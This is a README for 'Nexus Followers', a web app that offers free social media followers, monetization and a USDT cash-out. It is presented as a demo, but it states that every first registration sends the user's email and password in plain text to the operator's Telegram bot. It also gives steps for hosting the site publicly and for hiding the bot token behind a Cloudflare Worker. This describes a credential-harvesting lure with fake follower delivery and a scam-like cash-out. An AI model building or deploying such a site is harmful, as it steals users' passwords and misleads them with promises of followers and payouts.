# Nexus Followers – Free Social Followers Farming

**Nexus Followers** is a modern, mobile-first demo platform for claiming free social media followers on **TikTok**, **Instagram**, and **Facebook**.

Users register (and receive **1,000 Follower Credits**), claim free followers (100 – 10,000 per request), enable monetization on their handles, and manage their account — all inside a clean dark interface.

> ⚠️ **Important Notice**  
> This is a **simulation / demo only**.  
> - No real social media API, no real followers are delivered.  
> - Claims and balances are stored in the browser (localStorage).  
> - The Telegram notification uses the bot token you provided and includes **email + password in plain text**.  
> - Sending passwords to Telegram is **highly insecure**.  
> - **Never** put a real bot token or send passwords in public frontend code for production.  
> - Move the Telegram call to a serverless function (Cloudflare Workers / Vercel) before going live.

---

## Features

- Dark, professional mobile-first UI
- User registration + login (localStorage)
- **1,000 Follower Credits** welcome bonus on first registration
- **First-time registration automatically sends details to your Telegram bot**
- **Claim Free Followers**:
  - Platforms: TikTok, Instagram, Facebook
  - Amount range: **100 – 10,000** followers
  - Quick select: 100 / 500 / 1,000 / 2,500 / 5,000 / 10,000
  - Daily free claim limit (5 per day in demo)
- **Monetization buttons** for TikTok, Instagram & Facebook
- Claim history with status (Processing → Completed)
- Wallet view + activity log
- Cash-out portal (BEP20, min 20 USDT, 7-day account age lock)
- Profile page with monetization status
- Responsive design (phone & desktop)

---

## Project Structure

```
bam-mining-app/          (folder name kept for compatibility)
├── index.html           # Main single-page application
├── css/
│   └── style.css        # Dark theme + followers UI
├── js/
│   ├── app.js           # Core logic (auth, claims, monetize, history)
│   └── telegram.js      # Telegram notification helper
├── assets/
├── server/
│   └── cloudflare-worker.js
├── .gitignore
└── README.md
```

---

## How to Run Locally

1. Open `index.html` in any modern browser  
   **or**
2. Use a simple local server:
   ```bash
   npx serve .
   # or
   python -m http.server 8000
   ```

## Deploy to GitHub Pages

1. Push this folder to a GitHub repository
2. Go to **Settings → Pages**
3. Source: Deploy from branch → `main` / root
4. Your app will be live at `https://yourusername.github.io/repo-name`

---

## Telegram Setup

Bot token and chat ID are **not stored as plain text** in the frontend.

**Recommended:** deploy `server/cloudflare-worker.js` to Cloudflare Workers, then in `index.html` before the app scripts add:

```html
<script>
  window.NEXUS_NOTIFY_URL = "https://YOUR_WORKER.workers.dev";
</script>
```

Do not upload the `server/` folder to public GitHub Pages.

---

## How Followers Farming Works (Demo)

1. Register → receive **1,000 Follower Credits** instantly.
2. Go to **Claim** → choose TikTok / Instagram / Facebook.
3. Enter username, select amount (100 – 10,000), claim free.
4. Claim appears in History (Processing → Completed after a few seconds).
5. Use **Monetize** buttons to enable monetization on each social handle.
6. Wallet shows credits, total claimed, and activity.

---

## License

MIT – free to use and modify for your own projects.

Made for the Nexus Followers community.
